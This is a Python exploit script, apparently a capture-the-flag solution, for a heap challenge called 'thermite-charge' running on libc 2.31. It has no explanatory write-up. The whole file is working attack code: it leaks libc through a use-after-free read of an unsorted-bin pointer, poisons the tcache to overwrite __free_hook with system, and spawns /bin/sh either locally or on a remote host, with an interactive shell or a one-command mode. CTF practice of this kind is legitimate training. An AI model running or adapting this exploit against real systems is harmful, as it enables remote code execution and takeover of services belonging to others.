#!/usr/bin/env python3
"""Local/remote exploit for Hells Bells (thermite-charge)."""

import argparse
import os
import select
import socket
import struct
import subprocess
import sys


UNSORTED_FD = 0x1ECBE0
FREE_HOOK = 0x1EEE48
SYSTEM = 0x52290


def p64(value):
    return struct.pack("<Q", value)


def u64(value):
    return struct.unpack("<Q", value.ljust(8, b"\0"))[0]


class Tube:
    def __init__(self, host=None, port=None):
        if host is None:
            # The challenge uses a relative 2.31 loader.  libc.so.6 is a local
            # symlink to the supplied libc-2.31.so (created below if needed).
            if not os.path.exists("libc.so.6"):
                os.symlink("libc-2.31.so", "libc.so.6")
            self.proc = subprocess.Popen(
                ["./thermite-charge"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0,
            )
            self.sock = None
            self.rfd = self.proc.stdout.fileno()
        else:
            self.proc = None
            self.sock = socket.create_connection((host, port))
            self.rfd = self.sock.fileno()

    def recv(self, size=4096):
        if self.sock is not None:
            return self.sock.recv(size)
        return os.read(self.rfd, size)

    def recvn(self, size):
        result = b""
        while len(result) < size:
            part = self.recv(size - len(result))
            if not part:
                raise EOFError("short read")
            result += part
        return result

    def recvuntil(self, marker):
        result = b""
        while not result.endswith(marker):
            part = self.recv(1)
            if not part:
                raise EOFError(result)
            result += part
        return result

    def send(self, data):
        if self.sock is not None:
            self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def sendline(self, data):
        if not isinstance(data, bytes):
            data = str(data).encode()
        self.send(data + b"\n")

    def interactive(self):
        while True:
            readable, _, _ = select.select([self.rfd, sys.stdin.fileno()], [], [])
            if self.rfd in readable:
                data = self.recv()
                if not data:
                    return
                os.write(sys.stdout.fileno(), data)
            if sys.stdin.fileno() in readable:
                data = os.read(sys.stdin.fileno(), 4096)
                if not data:
                    return
                self.send(data)


def exploit(io):
    prompt = b"> "

    def plant(slot, size, data):
        assert len(data) == size
        io.recvuntil(prompt)
        io.sendline(1)
        io.recvuntil(b"slot (0-15): ")
        io.sendline(slot)
        io.recvuntil(b"size: ")
        io.sendline(size)
        io.recvuntil(b"payload: ")
        io.send(data)

    def defuse(slot, wait=True):
        io.recvuntil(prompt)
        io.sendline(2)
        io.recvuntil(b"slot: ")
        io.sendline(slot)
        if wait:
            io.recvuntil(b"charge defused\n")

    def rewire(slot, data):
        io.recvuntil(prompt)
        io.sendline(3)
        io.recvuntil(b"slot: ")
        io.sendline(slot)
        io.recvuntil(b"new payload: ")
        io.send(data)

    def inspect(slot, size):
        io.recvuntil(prompt)
        io.sendline(4)
        io.recvuntil(b"slot: ")
        io.sendline(slot)
        io.recvuntil(b"payload: ")
        return io.recvn(size)

    # A 0x510 chunk bypasses tcache.  The guard prevents consolidation with
    # the top chunk, leaving main_arena+0x60 in the freed user area.
    plant(0, 0x500, b"A" * 0x500)
    plant(1, 0x18, b"G" * 0x18)
    defuse(0)
    arena_leak = u64(inspect(0, 0x500)[:8])
    libc = arena_leak - UNSORTED_FD
    free_hook = libc + FREE_HOOK
    system = libc + SYSTEM
    print(f"[+] unsorted-bin leak: {arena_leak:#x}", file=sys.stderr)
    print(f"[+] libc base:         {libc:#x}", file=sys.stderr)
    print(f"[+] __free_hook:       {free_hook:#x}", file=sys.stderr)
    print(f"[+] system:            {system:#x}", file=sys.stderr)

    # Fill the 0x20 tcache bin with two entries.  The program retains both
    # pointers after free, so rewire gives a UAF write into the bin head.
    plant(2, 0x18, b"A" * 0x18)
    plant(3, 0x18, b"B" * 0x18)
    defuse(2)
    defuse(3)
    rewire(3, p64(free_hook - 8) + b"X" * 16)

    # First malloc returns slot 3 and leaves the poisoned address at the head.
    # The second returns __free_hook-8, allowing the exact-sized read to put
    # system in __free_hook.  Slot 4 supplies system's "/bin/sh" argument.
    plant(4, 0x18, b"/bin/sh\0" + b"S" * 16)
    plant(5, 0x18, p64(0) + p64(system) + p64(0))

    # Do not wait for the normal "charge defused" message: free(slot4) now
    # blocks inside system("/bin/sh") until the spawned shell exits.
    defuse(4, wait=False)
    return io


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?")
    parser.add_argument("port", nargs="?", type=int)
    parser.add_argument("--cmd", help="run one shell command and exit")
    args = parser.parse_args()
    if (args.host is None) != (args.port is None):
        parser.error("provide both host and port, or neither for local mode")

    io = exploit(Tube(args.host, args.port))
    if args.cmd:
        io.sendline(args.cmd.encode() + b"; exit")
        while True:
            data = io.recv()
            if not data:
                break
            os.write(sys.stdout.fileno(), data)
            if b"charge defused" in data:
                break
    else:
        print("[+] shell spawned", file=sys.stderr)
        io.interactive()


if __name__ == "__main__":
    main()
